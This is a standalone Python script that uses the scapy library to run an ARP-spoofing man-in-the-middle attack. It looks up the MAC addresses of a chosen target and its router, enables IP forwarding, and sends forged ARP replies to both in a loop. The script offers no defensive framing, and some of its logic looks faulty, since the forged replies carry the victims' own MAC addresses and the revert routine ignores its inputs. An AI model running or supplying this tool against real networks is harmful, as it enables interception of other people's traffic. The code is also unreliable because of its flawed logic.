from scapy.all import *
import os
def revert(rm,ri,tm,ti):
	arp=ARP()
	arp.pdst=ri
	send(arp)
	arp.pdst=ti
	send(arp)


target_ip=input("Enter the target's ip address")
router_ip=input("Enter the router's ip address")
router_mac=""
arp_packet=ARP()
arp_packet.pdst=router_ip
arp_packet.op=1
final_packet=arp_packet
response=sr1(final_packet)
router_mac=response[0].hwsrc
target_mac=""
arp_packet.pdst=target_ip
response=sr1(arp_packet)
target_mac=response[0].hwsrc	
print("The target mac is: "+target_mac+" The router mac is: "+router_mac)
sp=os.system('sysctl -w "net.ipv4.ip_forward=1"')
os.system('sleep 5')

while True:
	try:
		'''Spoofing the target machine'''
		arp_packet.pdst=target_ip
		arp_packet.hwsrc=router_mac
		arp_packet.op=2
		send(arp_packet)
	
		'''Spoofing the router'''
		arp_packet.pdst=router_ip
		arp_packet.hwsrc=target_mac
		arp_packet.op=2
		send(arp_packet)
	except KeyboardInterrupt:
		revert(router_mac,router_ip,target_mac,target_ip)
		break

